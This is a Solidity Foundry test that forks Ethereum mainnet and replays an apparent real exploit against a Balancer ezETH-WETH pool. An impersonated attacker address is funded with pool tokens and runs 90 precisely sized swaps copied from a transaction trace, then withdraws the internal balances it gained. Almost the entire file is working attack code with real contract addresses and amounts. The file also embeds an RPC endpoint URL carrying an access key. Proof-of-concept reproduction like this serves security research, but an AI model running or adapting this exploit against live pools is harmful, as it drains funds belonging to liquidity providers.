// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BalancerEzEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant POOL_ID_EZETH = 0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659;
    address constant ezETH_WETH_BPT = 0x596192bB6e41802428Ac943D2f1476C1Af25CC0E;
    address constant ezETH = 0xbf5495Efe5DB9ce00f80364C8B423567e58d2110;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;        // GIVEN_OUT amount
        uint256 expectedIn;    // Expected amount to pay
        uint8 indexIn;
        uint8 indexOut;
    }

    function testEzEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: ezETH-WETH (0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659)");
        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_EZETH);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("ezETH:", initialBalances[1] / 1e18, "ETH");
        console.log("WETH:", initialBalances[2] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(ezETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(ezETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(ezETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;

        swaps[0] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 751157288443127704401,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[1] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 437689641031338129357,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[2] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 7511572884431277044,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[3] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 4376896410313381293,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[4] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 75115728844312770,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[5] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 43768964103133813,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[6] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 751157288443128,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[7] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 437689641031338,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[8] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 7511572884431,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[9] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 4376896410314,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[10] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 75115728845,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[11] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 43768964103,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[12] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 751157288,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[13] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 437689641,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[14] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 7511573,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[15] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 4376896,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[16] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 75116,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[17] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 43769,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[18] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 751,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[19] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 438,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[20] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: ezETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[21] = ExactSwapData({
            tokenIn: ezETH_WETH_BPT,
            tokenOut: address(WETH),
            amount: 5,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[22] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 99999999984,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[23] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[24] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 750000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[25] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 77615,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[26] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[27] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 530000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[28] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 8669,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[29] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[30] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 370000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[31] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 1584,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[32] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[33] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 260000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[34] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 38627,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[35] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[36] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 180000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[37] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 1155,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[38] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[39] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 130000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[40] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 8631,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[41] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[42] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 93000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[43] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 4522665,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[44] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[45] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 69000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[46] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 270181,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[47] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[48] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 49000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[49] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 2413,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[50] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[51] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 35000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[52] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 7331,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[53] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[54] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 25000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[55] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 21243,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[56] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[57] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 17000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[58] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 413,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[59] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[60] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 12000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[61] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 316,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[62] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[63] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 9000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[64] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 3143221574,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[65] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[66] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 6400000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[67] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 44220,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[68] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[69] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 4600000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[70] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 382876,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[71] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[72] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 3300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[73] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 20734,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[74] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[75] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 2300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[76] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 1079,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[77] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[78] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 1600000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[79] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 355,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[80] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH,
            amount: 15,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[81] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: address(WETH),
            amount: 1080000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[82] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: ezETH_WETH_BPT,
            amount: 10000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[83] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH_WETH_BPT,
            amount: 10000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[84] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: ezETH_WETH_BPT,
            amount: 10000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[85] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH_WETH_BPT,
            amount: 10000000000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[86] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: ezETH_WETH_BPT,
            amount: 10000000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[87] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH_WETH_BPT,
            amount: 10000000000000000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[88] = ExactSwapData({
            tokenIn: ezETH,
            tokenOut: ezETH_WETH_BPT,
            amount: 597922002076198159981,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[89] = ExactSwapData({
            tokenIn: address(WETH),
            tokenOut: ezETH_WETH_BPT,
            amount: 597922002076198159981,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_EZETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // Withdrawal via manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(ezETH_WETH_BPT);
        internalTokens[1] = IERC20(ezETH);
        internalTokens[2] = IERC20(address(WETH));

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  ezETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  WETH:", internalBalances[2] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ezETH_WETH_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ezETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_EZETH);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("ezETH:", finalBalances[1] / 1e18, "ETH");
        console.log("WETH:", finalBalances[2] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(ezETH_WETH_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("ezETH:", IERC20(ezETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps:", successCount);
        console.log("SUCCESS!");
    }

}
